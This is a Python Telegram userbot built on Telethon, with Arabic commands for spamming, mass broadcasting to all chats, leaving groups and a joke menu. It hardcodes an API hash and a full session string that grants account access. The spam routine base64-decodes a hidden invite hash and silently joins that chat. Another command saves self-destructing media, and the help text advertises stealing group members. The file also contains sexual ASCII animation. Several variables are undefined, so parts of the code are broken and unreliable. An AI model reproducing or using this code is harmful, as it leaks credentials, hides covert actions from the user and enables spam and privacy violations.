import os
import base64
import logging
import asyncio
import time
import random
import pytz
from telethon import TelegramClient, events, functions
from telethon import TelegramClient, events
from telethon.tl.functions.photos import UploadProfilePhotoRequest, GetUserPhotosRequest
from telethon.tl.types import InputPeerEmpty
from telethon.tl.types import ChannelParticipantsAdmins
from datetime import datetime
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl import functions, types
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.utils import get_display_name
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events
from collections import deque
from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
    UserNotMutualContactError,
    UserPrivacyRestrictedError,
)
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.sessions import StringSession
from telethon.tl.types import InputPeerUser
import telethon
from telethon import TelegramClient, events
from telethon.tl.functions.account import UpdateProfileRequest
from datetime import datetime
from pytz import timezone # 
from telethon.tl.functions.contacts import GetBlockedRequest, UnblockRequest
from pytz import timezone
#client
DEFAULTUSERBIO = "الحمد الله"
APP_ID  = "9398423"
API_HASH = "f059e61617b899e13ebcaceabcb58545"
STRING = "1AZWarzMBuxaPvvU3MAhs2Qtv_1TO1eZtoIQiWlDvrx3erD8aK_6dhKXzceLoKxMaFR9Y5jwb5KwTHrElr5NYJdONr-FK50oBdFyle0ow1k3BWVII282wOqjFjLaVLgcAJ2v7eSceTtZpYlsBxTFrq16s5_NrLTZ7ZdnWOLmE3ZgM_yt7U58WG6IKcc_Z9gcQuItYXSbLtciyiu-WPCZyZCd2rjiFqHkuerTifb8dvzzaunxNXDh3HcmVZsZNErDpYa605jcE1uIhyc68lL3b_4ONHPZs-Hh31ys4SGgUuYZ--A4FzWLRHcnYv8icbkDSOivOj_q2Zyl9ARBt1gxqxukx7Go_dtY="

client = TelegramClient(StringSession(STRING), APP_ID, API_HASH)
client.start()

LOGS = logging.getLogger(__name__)

logging.basicConfig(
    format="[%(levelname)s- %(asctime)s]- %(name)s- %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
)



timezone = pytz.timezone('Asia/Baghdad')

# دالة تحديث الاسم


@client.on(events.NewMessage(outgoing=True, pattern=".ذاتية"))
async def roz(bakar):
    if not bakar.is_reply:
        return await bakar.edit(
            "**❃ يجب عليك الرد على صورة ذاتيه التدمير او صورة مؤقته**"
        )
    rr9r7 = await bakar.get_reply_message()
    pic = await rr9r7.download_media()
    await client.send_file(
        "me", pic, caption=f"**⪼ عزيزي هذه هي الصورة او الفيديو التي تم حفظه هنا**"
    )
    await bakar.delete()

@client.on(events.NewMessage(pattern='.ايدي'))
async def handler(event):
   me = await client.get_me()
   if event.sender_id == me.id:
       if event.is_reply:
           original_msg = await event.get_reply_message()
           if original_msg.sender:
               user = await client.get_entity(original_msg.sender_id)
               info_msg = f""" 
  📝  
                    ★•┉  ┉ ┉┉ ┉ ┉  ┉ ┉ ┉ ┉•★ 
                    
✦╎الاسـم    ⇠ {user.first_name} {user.last_name or ""}\n
✦╎المعرف  ⇠ @{user.username}\n
✦╎الايدي   ⇠ {user.id}\n
ٴ★•┉ ┉ ┉ ┉ ┉ ┉  ┉ ┉ ┉ ┉•★"""

               photos = await client(GetUserPhotosRequest(user_id=user.id, offset=0, max_id=0, limit=1))
               if photos.photos:
                   photo = photos.photos[0]
                   await client.send_file(event.chat_id, photo, caption=info_msg)
               else:
                   await event.reply('هذا المستخدم لا يمتلك صورة شخصية.')
       else:
           await event.reply('الرجاء الرد على رسالة المستخدم للحصول على معلوماته.')
   else:
       await event.reply( '.')
            

@client.on(events.NewMessage(pattern='.تصفية الكروبات'))
async def exit_groups(event):
    if event.sender_id == (await client.get_me()).id:
        groups_exited = 0  # متغير لتتبع عدد المجموعات التي تم الخروج منها
        async for dialog in client.iter_dialogs():
            if dialog.is_group:
                # التحقق من أن المستخدم ليس مشرفًا في المجموعة
                member = await client.get_permissions(dialog.id, user_id=event.sender_id)
                if member.is_admin:
                    print(f'لا يمكن الخروج من المجموعة لأنك مشرف فيها: {dialog.name}')
                else:
                    await client(LeaveChannelRequest(dialog.id))
                    groups_exited += 1  # زيادة العداد
                    print(f'تم الخروج من المجموعة: {dialog.name}')
                    
        # حذف رسالة الأمر
        await event.delete()
        # إرسال تأكيد العملية مع عدد المجموعات التي تم الخروج منها
        await client.send_message(event.chat_id, f'تم الخروج من {groups_exited} مجموعات.')
    else:
        # رسالة في حالة عدم صلاحية المرسل
        await event.reply('.')
       
@client.on(events.NewMessage(outgoing=True, pattern=".بايو وقتي"))
async def _(event):
    if event.fwd_from:
        return
    while True:
        HM = time.strftime("%H:%M")
        for normal in HM:
            if normal in normzltext:
                namefont = namerzfont[normzltext.index(normal)]
                HM = HM.replace(normal, namefont)
        bio = f"{DEFAULTUSERBIO} |️ {HM}"
        LOGS.info(bio)
        try:
            await client(
                functions.account.UpdateProfileRequest(
                    about=bio
                )
            )
        except FloodWaitError as ex:
            LOGS.warning(str(e))
            await asyncio.sleep(ex.seconds)
        await asyncio.sleep(DEL_TIME_OUT)


@client.on(events.NewMessage(outgoing=True, pattern=".للكروبات(?: |$)(.*)"))
async def gcast(event):
    client = event.pattern_match.group(1)
    if client:
        msg = client
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "**⌔∮ يجب الرد على رساله او وسائط او كتابه النص مع الامر**"
        )
        return
    roz = await event.edit("⌔∮ يتم الاذاعة في الخاص انتظر لحضه")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                if chat not in GCAST_BLACKLIST:
                    await event.client.send_message(chat, msg)
                    done += 1
            except BaseException:
                er += 1
    await roz.edit(
        f"**⌔∮  تم بنجاح الأذاعة الى ** `{done}` **من الدردشات ، خطأ في ارسال الى ** `{er}` **من الدردشات**"
    )


@client.on(events.NewMessage(outgoing=True, pattern=".للخاص(?: |$)(.*)"))
async def gucast(event):
    client = event.pattern_match.group(1)
    if client:
        msg = client
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "**⌔∮ يجب الرد على رساله او وسائط او كتابه النص مع الامر**"
        )
        return
    roz = await event.edit("⌔∮ يتم الاذاعة في الخاص انتظر لحضه")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                if chat not in DEVS:
                    await event.client.send_message(chat, msg)
                    done += 1
            except BaseException:
                er += 1
    await roz.edit(
        f"**⌔∮  تم بنجاح الأذاعة الى ** `{done}` **من الدردشات ، خطأ في ارسال الى ** `{er}` **من الدردشات**"
    )

@client.on(events.NewMessage(outgoing=True, pattern=".تكرار (.*)"))
async def spammer(event):
    sandy = await event.get_reply_message()
    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    await spam_function(event, sandy, cat, sleeptimem, sleeptimet)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await _catutils.unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass
            

@client.on(events.NewMessage(outgoing=True, pattern=".مؤقت (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
 
@client.on(events.NewMessage(outgoing=True, pattern=".التسلية"))
async def _(event):
      await event.edit(""" --------------------------------------------------------------
قائمة اوامر التسليه
--------------------------------------------------------------
.قمر 

.قمور 

.رموز 

.حلويات 

.اسماء 

.فاك

.طيارة

.فراشه

.ورده

.قطار

.مزه

.قصة حب

.اكتب + الكلام

.فشر

.موسيقى

.دوران

.ضحك """)

@client.on(events.NewMessage(outgoing=True, pattern=".مزه"))
async def _(event):
    if event.fwd_from:
        return
    mentions = "`´´´´´████████´´\n´´`´███▒▒▒▒███´´´´´\n´´´███▒●▒▒●▒██´´´\n´´´███▒▒👄▒▒██´´\n´´█████▒▒████´´´´´\n´█████▒▒▒▒███´´\n█████▒▒▒▒▒▒███´´´´\n´´▓▓▓▓▓▓▓▓▓▓▓▓▓▒´´\n´´▒▒▒▒▓▓▓▓▓▓▓▓▓▒´´´´´\n´.▒▒▒´´▓▓▓▓▓▓▓▓▒´´´´´\n´.▒▒´´´´▓▓▓▓▓▓▓▒\n..▒▒.´´´´▓▓▓▓▓▓▓▒\n´▒▒▒▒▒▒▒▒▒▒▒▒\n´´´´´´´´´███████´´´´\n´´´´´´´´████████´´´´´´\n´´´´´´´█████████´´´´´\n´´´´´´██████████´´´\n´´´´´´██████████´´\n´´´´´´´█████████´\n´´´´´´´█████████´\n´´´´´´´´████████´´´\n´´´´´´´´´´´▒▒▒▒▒´´´\n´´´´´´´´´´▒▒▒▒▒´´´\n´´´´´´´´´´▒▒▒▒▒´´´\n´´´´´´´´´´▒▒´▒▒´´´\n´´´´´´´´´▒▒´´▒▒´´´\n´´´´´´´´´´▒▒´´´▒▒´´´\n´´´´´´´´´▒▒´´´▒▒´´´\n´´´´´´´´▒▒´´´´´▒▒´´´\n´´´´´´´´▒▒´´´´´´▒▒´´´\n´´´´´´´´███´´´´███´´´\n´´´´´´´´████´´███´´´\n´´´´´´´´█´´███´´████´´´`"
    chat = await event.get_input_chat()
    async for x in client.iter_participants(chat, filter=ChannelParticipantsAdmins):
        mentions += f""
    reply_message = None
    if event.reply_to_msg_id:
        reply_message = await event.get_reply_message()
        await reply_message.reply(mentions)
    else:
        await event.reply(mentions)
    await event.delete()
   

@client.on(events.NewMessage(outgoing=True, pattern=".قصة حب"))
async def _(event):

    if event.fwd_from:

        return

    animation_interval = 3

    animation_ttl = range(0, 103)

    #input_str = event.pattern_match.group(1)

    #if input_str == "lovestory":

    await event.edit("Starting asf")

    animation_chars = [

            "1 ❤️ love story",
            "  😐             😕 \n/👕\         <👗\ \n 👖               /|",    
            "  😉          😳 \n/👕\       /👗\ \n  👖            /|",
            "  😚            😒 \n/👕\         <👗> \n  👖             /|",
            "  😍         ☺️ \n/👕\      /👗\ \n  👖          /|",
            "  😍          😍 \n/👕\       /👗\ \n  👖           /|",
            "  😘   😊 \n /👕\/👗\ \n   👖   /|",
            " 😳  😁 \n /|\ /👙\ \n /     / |",    
            "😈    /😰\ \n<|\      👙 \n /🍆    / |",
            "😅 \n/(),✊😮 \n /\         _/\\/|",
            "😎 \n/\\_,__😫 \n  //    //       \\",
            "😖 \n/\\_,💦_😋  \n  //         //        \\",
            "  😭      ☺️ \n  /|\   /(👶)\ \n  /!\   / \ ",
            "The End 😂..."
        ]

    for i in animation_ttl:

        await asyncio.sleep(animation_interval)

        await event.edit(animation_chars[i % 103])


@client.on(events.NewMessage(outgoing=True, pattern=".وقتي.."))
async def _(event):
      await event.edit("""--------------------------------------------------------------
قائمه اوامر الوقتي
--------------------------------------------------------------

.اسم وقتي 
- لبدء الاسم الوقتي

.ايقاف الاسم الوقتي
- لايقاف الاسم الوقتي
""") 
@client.on(events.NewMessage(outgoing=True, pattern=".اوامر"))
async def _(event):
      await event.edit(""" **

〝 𓄶 𓄷𓄶 𓄷𓄶 𓄷𓄶 𓄷𓄶 𓄷𓄶  〞
               
〝 Order Telethon X  2.0〞
𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧

```.فحص```
- لتجربة السورس
𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧
```.محادثات```
لجلب جميع المحادثات
𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧
```.مؤقت + وقت بالثواني  + عدد تكرار + نص```
- يقوم بعمل تكرار مؤقت للكلام 
𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧
```.تكرار + عدد التكرار + الكلام المراد تكراره ```
- يقوم بتكرار الكلام
𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧
```.ضيف + رابط مجموعه عامه```
- ارسل الامر في مجموعتك واكتب الامر مع رابط مجموعه عامه ليقوم بسرقه لاعضاء منها
𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧
```.للخاص + كلام```
- اكتب الامر مع كلام لعمل اذاعه للكلام للخاص
𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧
```.للكروبات + كلام```
- اكتب الامر مع كلام لعمل اذاعه للكلام للكروبات 
𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧
```.ذاتية```
- بالرد على صورة ذاتية التدمير لحفظها في الرسائل المحفوظه
𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧
```.ايدي```
- ترد على رسالة اي شخص بكلمة (.ايدي) تطلع لك معلوماتة 
𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧
```.تصفية الكروبات```
- يخرجك من كل الكروبات
𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧
```.فك المحظورين```
- لألغاء جميع المستخدمين الذين حظرتهم في الخاص
( ممكن يعلق الامر بسبب الضغط وما يفك كل الحظرتهم فالحل تستخدمه مره ثانيه بوقت ثاني ) 
𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧
```.التسلية```
- لعرض اوامر التسليه
𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧𓏧
__
قناه السورس : ( X ) .
جميع الاوامر تكون بدايتها نقطة
__
〝 𓄶 𓄷𓄶 𓄷𓄶 𓄷𓄶 𓄷𓄶 𓄷𓄶 〞
**""")
      
@client.on(events.NewMessage(pattern='.فحص'))
async def send_photo(event):
   # رابط الفيديو الذي تريد إرساله
   photo_url = 'https://files.catbox.moe/1ov36t.jpg'
   # النص الذي تريد إضافته كتعليق
   caption = """**
   ✦‌‎┊Source  ⁂ X
✦‌‎┊PyThon ⁂ 3.8 
✦‌‎┊‌‎PinG ⁂ : 0.004
✦┊‌‎VeRsIoN mastar (1.0) ,
✦‌‎┊‌‎TeLeThoN X ⁂ X
**  
    """
   
   # إرسال الفيديو
   await client.send_file(event.chat_id, photo_url, caption=caption)
   
   # حذف الرسالة الأصلية
   await event.delete()

channel_username = '@GO_T0_U'

async def get_random_message():
    # الحصول على القناة
    channel = await client.get_entity(channel_username)
    
    # الحصول على الرسائل من القناة (بما في ذلك الوسائط)
    messages = await client.get_messages(channel, limit=100)
    
    # اختيار رسالة عشوائية
    return random.choice(messages)

@client.on(events.NewMessage)
async def handler(event):
    # التحقق من أن الرسالة تحتوي على الأمر المطلوب ".شعر"
    if event.raw_text == ".اسماء":
        # جلب رسالة عشوائية
        random_message = await get_random_message()
        
        # التحقق من نوع الرسالة العشوائية
        if random_message.text:
            new_text = f""" **تـم جـلـب الاسـم بـنـجـاح ⬇**
            
            {random_message.text}"""
        elif random_message.photo:
            new_text = " **تـم جـلـب الاسـم بـنـجـاح ⬇** "
        elif random_message.video:
            new_text = " **تـم جـلـب الاسـم بـنـجـاح ⬇** "
        elif random_message.voice:
            new_text = " **تـم جـلـب الاسـم بـنـجـاح ⬇** "
        elif random_message.document:
            new_text = f""" ‌‎**تـم جـلـب الاسـم بـنـجـاح ⬇**
            
            : {random_message.document.mime_type}"""
        else:
            new_text = " **تـم جـلـب الاسـم بـنـجـاح ⬇** "

        # تعديل الرسالة الأصلية واستبدالها بالمحتوى الجديد
        await event.edit(new_text)

@client.on(events.NewMessage(outgoing=True, pattern=".رموز"))
async def _(event):
      await event.edit("""𓅄 𓅅 𓅆 𓅇 𓅈 𓅉 𓅊 𓅋 𓅌 𓅍 𓅎 𓅏 𓅐 𓅑 𓅒 𓅓 𓅔𓅕 𓅖 𓅗 𓅘 𓅙 𓅚 𓅛 𓅜 𓅝 𓅞 𓅟 𓅠 𓅡 𓅢 𓅣 𓅤 𓅥 𓅦 𓅧 𓅨 𓅩 𓅫 𓅬 𓅭 𓅮 𓅯 𓅰 𓅱 𓅲 𓅳 𓅴 
𓅵 𓅶 𓅷 𓅸 𓅹 𓅺 𓅻 
 ☤ 𓅾 𓅿 𓆀 𓆁 𓆂
𓀀 𓀁 𓀂 𓀃 𓀄 𓀅 𓀆 𓀇 𓀈 𓀉 𓀊 𓀋 𓀌 𓀍 𓀎 𓀏 𓀐 𓀑 𓀒 𓀓 𓀔 𓀕 𓀖 𓀗 𓀘 𓀙 𓀚 𓀛 𓀜 𓀝 𓀞 𓀟 𓀠 𓀡 𓀢 𓀣 𓀤 𓀥 𓀦 𓀧 𓀨 𓀩 𓀪 𓀫 𓀬 𓀭 𓀮 𓀯 𓀰 𓀱 𓀲 𓀳 𓀴 𓀵 𓀶 𓀷 𓀸 𓀹 𓀺 𓀻 𓀼 𓀽 𓀾 𓀿 𓁀 𓁁 𓁂 𓁃 𓁄 𓁅 𓁆 𓁇 𓁈 𓁉 𓁊 𓁋 𓁌 𓁍 𓁎 𓁏 𓁐 𓁑 𓁒 𓁓 𓁔 𓁕 𓁖 𓁗 𓁘 𓁙 𓁚 𓁛 𓁜 𓁝 𓁞 𓁟 𓁠 𓁡 𓁢 𓁣 𓁤 𓁥 𓁦 𓁧 𓁨 𓁩 𓁪 𓁫 𓁬 𓁭 𓁮 𓁯 𓁰 𓁱 𓁲 𓁳 𓁴 𓁵 𓁶 𓁷 𓁸 𓁹 𓁺 𓁻 𓁼 𓁽 𓁾 𓁿 𓂀𓂅 𓂆 𓂇 𓂈 𓂉 𓂊 𓂋 𓂌 𓂍 𓂎 𓂏 𓂐 𓂑 𓂒 𓂓 𓂔 𓂕 𓂖 𓂗 𓂘 𓂙 𓂚 𓂛 𓂜 𓂝 𓂞 𓂟 𓂠 𓂡 𓂢 𓂣 𓂤 𓂥 𓂦 𓂧 𓂨 𓂩 𓂪 𓂫 𓂬 𓂭 𓂮 𓂯 𓂰 𓂱 𓂲 𓂳 𓂴 𓂵 𓂶 𓂷 𓂸 𓂹 𓂺 𓂻 𓂼 𓂽 𓂾 𓂿 𓃀 𓃁 𓃂 𓃃 𓃅 𓃆 𓃇 𓃈 𓃉 𓃊 𓃋 𓃌 𓃍 𓃎 𓃏 𓃐 𓃑 𓃒 𓃓 𓃔 𓃕 𓃖 𓃗 𓃘 𓃙 𓃚 𓃛 𓃜 𓃝 𓃞 𓃟 𓃠 𓃡 𓃢 𓃣 𓃤 𓃥 𓃦 𓃧 𓃨 𓃩 𓃪 𓃫 𓃬 𓃭 𓃮 𓃯 𓃰 𓃱 𓃲 𓃳 𓃴 𓃵 𓃶 𓃷 𓃸 𓃹 𓃺 𓃻 𓃼 𓃽 𓃾 𓃿 𓄀 𓄁 𓄂 𓄃 𓄄 𓄅 𓄆 𓄇 𓄈 𓄉 𓄊 𓄋 𓄌 𓄍 𓄎 𓄏 𓄐 𓄑 𓄒 𓄓 𓄔 𓄕 𓄖 𓄙 𓄚 𓄛 𓄜 𓄝 𓄞 𓄟 𓄠 𓄡 𓄢 𓄣 𓄤 𓄥 𓄦 𓄧 𓄨 𓄩 𓄪 𓄫 𓄬 𓄭 𓄮 𓄯 𓄰 𓄱 𓄲 𓄳 𓄴 𓄵 𓄶 𓄷 𓄸 𓄹 𓄺   𓄼 𓄽 𓄾 𓄿 𓅀 𓅁 𓅂 𓅃 𓅄 𓅅 𓅆 𓅇 𓅈 𓅉 𓅊 𓅋 𓅌 𓅍 𓅎 𓅏 𓅐 𓅑 𓅒 𓅓 𓅔 𓅕 𓅖 𓅗 𓅘 𓅙 𓅚 𓅛 𓅜 𓅝 𓅞 𓅟 𓅠 𓅡 𓅢 𓅣 𓅤 𓅥 𓅦 𓅧 𓅨 𓅩 𓅪 𓅫 𓅬 𓅭 𓅮 𓅯 𓅰 𓅱 𓅲 𓅳 𓅴 𓅵 𓅶 𓅷 𓅸 𓅹 𓅺 𓅻 𓅼 𓅽 𓅾 𓅿 𓆀 𓆁 𓆂 𓆃 𓆄 𓆅 𓆆 𓆇 𓆈 𓆉 𓆊 𓆋 𓆌 𓆍 𓆎 𓆐 𓆑 𓆒 𓆓 𓆔 𓆕 𓆖 𓆗 𓆘 𓆙 𓆚 𓆛 𓆜 𓆝 𓆞 𓆟 𓆠 𓆡 𓆢 𓆣 𓆤 𓆥 𓆦 𓆧 𓆨 𓆩𓆪 𓆫 𓆬 𓆭 𓆮 𓆯 𓆰 𓆱 𓆲 𓆳 𓆴 𓆵 𓆶 𓆷 𓆸 𓆹 𓆺 𓆻 𓆼 𓆽 𓆾 𓆿 𓇀 𓇁 𓇂 𓇃 𓇄 𓇅 𓇆 𓇇 𓇈 𓇉 𓇊 𓇋 𓇌 𓇍 𓇎 𓇏 𓇐 𓇑 𓇒 𓇓 𓇔 𓇕 𓇖 𓇗 𓇘 𓇙 𓇚 𓇛 𓇜 𓇝 𓇞 𓇟 𓇠 𓇡 𓇢 𓇣 𓇤 𓇥 𓇦 𓇧 𓇨 𓇩 𓇪 𓇫 𓇬 𓇭 𓇮 𓇯 𓇰 𓇱 𓇲 𓇳 𓇴 𓇵 𓇶 𓇷 𓇸 𓇹 𓇺 𓇻 𓇼 𓇾 𓇿 𓈀 𓈁 𓈂 𓈃 𓈄 𓈅 𓈆 𓈇 𓈈 𓈉 𓈊 𓈋 𓈌 𓈍 𓈎 𓈏 𓈐 𓈑 𓈒 𓈓 𓈔 𓈕 𓈖 𓈗 𓈘 𓈙 𓈚 𓈛 𓈜 𓈝 𓈞 𓈟 𓈠 𓈡 𓈢 𓈣 𓈤  𓈥 𓈦 𓈧 𓈨 𓈩 𓈪 𓈫 𓈬 𓈭 𓈮 𓈯 𓈰 𓈱 𓈲 𓈳 𓈴 𓈵 𓈶 𓈷 𓈸 𓈹 𓈺 𓈻 𓈼 𓈽 𓈾 𓈿 𓉀 𓉁 𓉂 𓉃 𓉄 𓉅 𓉆 𓉇 𓉈 𓉉 𓉊 𓉋 𓉌 𓉍 𓉎 𓉏 𓉐 𓉑 𓉒 𓉓 𓉔 𓉕 𓉖 𓉗 𓉘 𓉙 𓉚 𓉛 𓉜 𓉝 𓉞 𓉟 𓉠 𓉡 𓉢 𓉣 𓉤 𓉥 𓉦 𓉧 𓉨 𓉩 𓉪 𓉫 𓉬 𓉭 𓉮 𓉯 𓉰 𓉱 𓉲 𓉳 𓉴 𓉵 𓉶 𓉷 𓉸 𓉹 𓉺 𓉻 𓉼 𓉽 𓉾 𓉿 𓊀 𓊁 𓊂 𓊃 𓊄 𓊅 𓊈 𓊉 𓊊 𓊋 𓊌 𓊍 𓊎 𓊏 𓊐 𓊑 𓊒 ?? 𓊔 𓊕 ?? ?? 𓊘 𓊙 𓊚 𓊛 𓊜 𓊝 𓊞 𓊟 𓊠 𓊡 𓊢 𓊣 𓊤 𓊥 𓊦 𓊧 𓊨 𓊩 𓊪 𓊫 𓊬 𓊭 𓊮 𓊯 𓊰 𓊱 𓊲 𓊳 𓊴 𓊵 𓊶 𓊷 𓊸 𓊹 𓊺 𓊻 𓊼 ?? ?? 𓊿 𓋀 𓋁 𓋂 𓋃 𓋄 𓋅 𓋆 𓋇 𓋈 𓋉 𓋊 𓋋 𓋌 𓋍 𓋎 𓋏 𓋐 𓋑 𓋒 𓋓 𓋔 𓋕 𓋖 𓋗 𓋘 𓋙 𓋚 𓋛 𓋜 𓋝 𓋞 𓋟 𓌰 𓌱 𓌲 𓌳 𓌴 𓌵 𓌶 𓌷 𓌸 𓌹 𓌺 𓌻 𓌼 𓌽 𓌾 𓌿 𓍀 𓍁 𓍂 𓍃 𓍄 𓍅 𓍆 𓍇 𓍈 𓍉 𓍊 𓍋 𓍌 𓍍 𓍎 𓍏 𓍐 𓍑 𓍒 𓍓 𓍔 𓍕 𓍖 𓍗 𓍘 𓍙 𓍚 𓍛 𓍜 𓍝 𓍞 𓍟 𓍠 𓍡 𓍢 𓍣 𓍤 𓍥 𓍦 𓍧 𓍨 𓍩 𓍪 𓍫 𓍬 𓍭 𓍮 𓍯 𓍰 𓍱 𓍲 𓍳 𓍴 𓍵 𓍶 𓍷 𓍸 𓍹 𓍺 𓍻 𓍼 𓍽 𓍾 𓍿 𓎀 𓎁 𓎂 𓎃 𓎄 𓎅 𓎆 𓎇 𓎈 𓎉 𓎊 𓎋 𓎌 𓎍 𓎎 𓎏 𓎐 𓎑 𓎒 𓎓 𓎔 𓎕 𓎖 𓎗 𓎘 𓎙 𓎚 𓎛 𓎜 𓎝 𓎞 𓎟 𓎠 𓎡 𓏋 𓏌 𓏍 𓏎 𓏏 𓏐 𓏑 𓏒 𓏓 
 𓏕 𓏖 𓏗 𓏘 𓏙 𓏚 𓏛 𓏜 𓏝 𓏞 𓏟 𓏠 𓏡 𓏢 𓏣 𓏤 𓏥 𓏦 𓏧 𓏨 𓏩 𓏪 𓏫 𓏬 𓏭 𓏮 𓏯 𓏰 𓏱 𓏲 𓏳 𓏴 𓏶 𓏷 𓏸 𓏹 𓏺 𓏻 𓏼 𓏽 𓏾 𓏿 𓐀 𓐁 𓐂 𓐃 𓐄 𓐅 𓐆
- 𖣨 ، ෴ ، 𖡺  ، 𖣐 ، ✜ ، ✘ ، 𖡻 ،
- ༄ ، ༺༻ ، ༽༼ ،  ╰☆╮،  
- ɵ̷᷄ˬɵ̷᷅ ، ⠉̮⃝ ، ࿇࿆ ، ꔚ، ま ، ☓ ،
𓆉 . 𓃠 .𓅿 . 𓃠 . 𓃒 . 𓅰 . 𓃱 . 𓅓 . 𐂃  . ꕥ  . ⌘ . ♾ .    ꙰  .  . ᤑ .  ﾂ .
✦ ,✫ ,✯, ✮ ,✭ ,✰, ✬ ,✧, ✤, ❅ , 𒀭,✵ , ✶ , ✷ , ✸ , ✹ ,⧫, . 𐂂 
-〘 𖢐 ، 𒍦 ، 𒍧 ، 𖢣 ، 𝁫 ، 𒍭 ، 𝁅 ، 𝁴 ، 𒍮 ، 𝁵 ، 𝀄 ، 𓏶 ، 𓏧 ، 𓏷 ، 𓏯 ، 𓏴 ، 𓏳 ، 𓏬 ، 𓏦 ، 𓏵 ، 𓏱 ، ᳱ ، ᯼ ، 𐃕 ، ᯥ ، ᯤ ، ᯾ ، ᳶ ، ᯌ ، ᢆ ،
 ᥦ ، ᨙ ، ᨚ  ، ᨔ  ، ⏢ ، ⍨ ، ⍃ ، ⏃ ، ⍦ ، ⏕ ، ⏤ ، ⏁ ، ⏂ ، ⏆ ، ⌳ ، ࿅ ، ࿕ ، ࿇ ، ᚙ ، ࿊ ، ࿈ ، ྿ ،
 ࿂ ، ࿑ ،  ᛥ ، ࿄ ، 𐀁 ، 𐀪 ، 𐀔 ، 𐀴 ، 𐀤 ، 𐀦 ، 𐀂 ، 𐀣 ، 𐀢 ، 𐀶 ، 𐀷 ، 𐂭 ، 𐂦 ، 𐂐 ، 𐂅 ، 𐂡 ، 𐂢 ، 𐂠 ، 𐂓 ، 𐂑 ، 𐃸 ، 𐃶 ، 𐂴 ، 𐃭 ، 𐃳 ، 𐃣 ، 𐂰 ، 𐃟 ، 𐃐 ، 𐃙 ، 𐃀 ، 𐇮 ، 𐇹 ، 𐇲 ، 𐇩 ، 𐇪 ، 𐇶 ، 𐇻 ، 𐇡 ، 𐇸 ، 𐇣 ، 𐇤 ، 𐎅 ، 𐏍 ، 𐎃 ، 𐏒 ، 𐎄 ، 𐏕 〙.
╔ ╗. 𓌹  𓌺 .〝  〞. ‹ ›  .「  」.〖 〗. 《》 .  < > . « »  . ﹄﹃
₁ ₂ ₃ ₄ ₅ ₆ ₇ ₈ ₉ ₀
